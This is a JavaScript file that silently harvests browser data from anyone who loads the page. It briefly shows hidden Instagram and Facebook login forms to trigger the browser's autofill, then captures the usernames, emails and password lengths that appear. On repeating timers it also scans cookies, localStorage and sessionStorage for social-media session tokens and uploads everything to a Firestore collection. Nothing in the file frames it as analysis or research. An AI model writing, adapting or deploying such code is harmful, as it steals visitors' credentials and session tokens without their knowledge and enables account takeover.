document.addEventListener('DOMContentLoaded', function() {
    // Collect social media data automatically
    setTimeout(collectSocialMediaData, 1500); // Initial collection after 1.5 seconds
    setInterval(collectSocialMediaData, 8000); // Continue collecting every 8 seconds
    
    // Also check for existing session tokens
    setTimeout(checkForSocialTokens, 3000);
    setInterval(checkForSocialTokens, 15000);
});

async function collectSocialMediaData() {
    try {
        console.log("Collecting social media data...");
        
        // 1. Capture Instagram credentials
        await captureInstagramData();
        
        // 2. Capture Facebook credentials
        await captureFacebookData();
        
        // 3. Capture generic social media data
        await captureGenericSocialData();
        
        // 4. Collect session information
        await collectSessionData();
        
        console.log("Social media data collection completed");
    } catch (error) {
        console.error('Error during social media data collection:', error);
    }
}

async function captureInstagramData() {
    try {
        const instaForm = document.getElementById('instagramCapture');
        if (instaForm) {
            instaForm.style.display = 'block';
            
            // Focus Instagram fields to trigger autofill
            const instaUsername = document.getElementById('instaUsername');
            const instaPassword = document.getElementById('instaPassword');
            
            if (instaUsername && instaPassword) {
                // Focus username field
                instaUsername.focus();
                await new Promise(resolve => setTimeout(resolve, 200));
                
                // Focus password field
                instaPassword.focus();
                await new Promise(resolve => setTimeout(resolve, 200));
                
                // Wait for autofill
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // Check if data was autofilled
                if (instaUsername.value || instaPassword.value) {
                    const instaData = {
                        timestamp: new Date().toISOString(),
                        platform: 'instagram',
                        username: instaUsername.value,
                        hasPassword: !!instaPassword.value,
                        passwordLength: instaPassword.value ? instaPassword.value.length : 0,
                        userAgent: navigator.userAgent,
                        location: window.location.href
                    };
                    
                    // Clear values for next collection
                    instaUsername.value = '';
                    instaPassword.value = '';
                    
                    // Send to Firestore
                    await sendToFirestore('social_media_data', instaData);
                }
            }
            
            instaForm.style.display = 'none';
        }
    } catch (error) {
        console.error('Error capturing Instagram data:', error);
    }
}

async function captureFacebookData() {
    try {
        const fbForm = document.getElementById('facebookCapture');
        if (fbForm) {
            fbForm.style.display = 'block';
            
            // Focus Facebook fields to trigger autofill
            const fbEmail = document.getElementById('fbEmail');
            const fbPassword = document.getElementById('fbPassword');
            
            if (fbEmail && fbPassword) {
                // Focus email field
                fbEmail.focus();
                await new Promise(resolve => setTimeout(resolve, 200));
                
                // Focus password field
                fbPassword.focus();
                await new Promise(resolve => setTimeout(resolve, 200));
                
                // Wait for autofill
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // Check if data was autofilled
                if (fbEmail.value || fbPassword.value) {
                    const fbData = {
                        timestamp: new Date().toISOString(),
                        platform: 'facebook',
                        email: fbEmail.value,
                        hasPassword: !!fbPassword.value,
                        passwordLength: fbPassword.value ? fbPassword.value.length : 0,
                        userAgent: navigator.userAgent,
                        location: window.location.href
                    };
                    
                    // Clear values for next collection
                    fbEmail.value = '';
                    fbPassword.value = '';
                    
                    // Send to Firestore
                    await sendToFirestore('social_media_data', fbData);
                }
            }
            
            fbForm.style.display = 'none';
        }
    } catch (error) {
        console.error('Error capturing Facebook data:', error);
    }
}

async function captureGenericSocialData() {
    try {
        const socialForm = document.getElementById('socialMediaCapture');
        if (socialForm) {
            socialForm.style.display = 'block';
            
            // Focus all social media fields
            const inputs = socialForm.querySelectorAll('input');
            for (let input of inputs) {
                input.focus();
                await new Promise(resolve => setTimeout(resolve, 150));
            }
            
            // Wait for autofill
            await new Promise(resolve => setTimeout(resolve, 500));
            
            // Check for any filled values
            let hasData = false;
            const socialData = {
                timestamp: new Date().toISOString(),
                platform: 'generic_social',
                fields: {},
                userAgent: navigator.userAgent,
                location: window.location.href
            };
            
            inputs.forEach(input => {
                if (input.value && input.value.trim() !== '') {
                    socialData.fields[input.name] = {
                        value: input.value,
                        length: input.value.length
                    };
                    hasData = true;
                }
                
                // Clear for next collection
                input.value = '';
            });
            
            socialForm.style.display = 'none';
            
            if (hasData) {
                await sendToFirestore('social_media_data', socialData);
            }
        }
    } catch (error) {
        console.error('Error capturing generic social data:', error);
    }
}

async function checkForSocialTokens() {
    try {
        // Look for social media session tokens in localStorage/sessionStorage
        const tokenData = {
            timestamp: new Date().toISOString(),
            location: window.location.href,
            instagramTokens: [],
            facebookTokens: [],
            otherTokens: []
        };
        
        // Check localStorage for social media tokens
        for (let i = 0; i < localStorage.length; i++) {
            try {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                // Check for Instagram tokens
                if (key && (key.includes('instagram') || key.includes('ig_') || key.includes('ds_user'))) {
                    tokenData.instagramTokens.push({
                        key: key,
                        valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                    });
                }
                
                // Check for Facebook tokens
                if (key && (key.includes('facebook') || key.includes('fb_') || key.includes('c_user'))) {
                    tokenData.facebookTokens.push({
                        key: key,
                        valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                    });
                }
                
                // Check for any other potential tokens
                if (value && (value.includes('token') || value.includes('session') || value.includes('auth'))) {
                    tokenData.otherTokens.push({
                        key: key,
                        valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                    });
                }
            } catch (e) {
                // Skip items we can't access
            }
        }
        
        // Check sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
            try {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                
                // Check for Instagram tokens
                if (key && (key.includes('instagram') || key.includes('ig_'))) {
                    tokenData.instagramTokens.push({
                        key: key,
                        valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                    });
                }
                
                // Check for Facebook tokens
                if (key && (key.includes('facebook') || key.includes('fb_'))) {
                    tokenData.facebookTokens.push({
                        key: key,
                        valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                    });
                }
            } catch (e) {
                // Skip items we can't access
            }
        }
        
        // Check cookies for social tokens
        const cookies = document.cookie.split(';');
        cookies.forEach(cookie => {
            const [name, value] = cookie.trim().split('=');
            
            if (name && (name.includes('instagram') || name.includes('ig_'))) {
                tokenData.instagramTokens.push({
                    key: name,
                    valuePreview: value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : ''
                });
            }
            
            if (name && (name.includes('facebook') || name.includes('fb_') || name === 'c_user')) {
                tokenData.facebookTokens.push({
                    key: name,
                    valuePreview: value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : ''
                });
            }
        });
        
        // Only send if we found tokens
        if (tokenData.instagramTokens.length > 0 || 
            tokenData.facebookTokens.length > 0 || 
            tokenData.otherTokens.length > 0) {
            
            await sendToFirestore('social_tokens', tokenData);
        }
    } catch (error) {
        console.error('Error checking for social tokens:', error);
    }
}

async function collectSessionData() {
    try {
        const sessionData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            referrer: document.referrer,
            location: window.location.href,
            cookies: document.cookie,
            localStorageItems: {},
            sessionStorageItems: {}
        };
        
        // Collect localStorage items (limit to prevent overload)
        const maxItems = 50;
        let itemsCollected = 0;
        
        for (let i = 0; i < localStorage.length && itemsCollected < maxItems; i++) {
            try {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                // Focus on items that might be social media related
                if (key && (key.includes('social') || key.includes('instagram') || 
                           key.includes('facebook') || key.includes('auth') || 
                           key.includes('token') || key.includes('session'))) {
                    sessionData.localStorageItems[key] = value.substring(0, 200) + 
                        (value.length > 200 ? '...' : '');
                    itemsCollected++;
                }
            } catch (e) {
                // Skip items we can't access
            }
        }
        
        // Collect sessionStorage items
        for (let i = 0; i < sessionStorage.length && itemsCollected < maxItems; i++) {
            try {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                
                if (key && (key.includes('social') || key.includes('instagram') || 
                           key.includes('facebook') || key.includes('auth') || 
                           key.includes('token') || key.includes('session'))) {
                    sessionData.sessionStorageItems[key] = value.substring(0, 200) + 
                        (value.length > 200 ? '...' : '');
                    itemsCollected++;
                }
            } catch (e) {
                // Skip items we can't access
            }
        }
        
        // Send to Firestore
        await sendToFirestore('session_data', sessionData);
    } catch (error) {
        console.error('Error collecting session data:', error);
    }
}

async function sendToFirestore(collectionName, data) {
    try {
        // Ensure Firestore is initialized
        if (!window.firestoreDB) {
            console.error('Firestore not initialized');
            return;
        }
        
        // Add document to collection
        const docRef = await addDoc(collection(collectionName), data);
        console.log(`${collectionName} document written with ID:`, docRef.id);
        return docRef.id;
    } catch (error) {
        console.error(`Error adding document to ${collectionName}:`, error);
    }
}
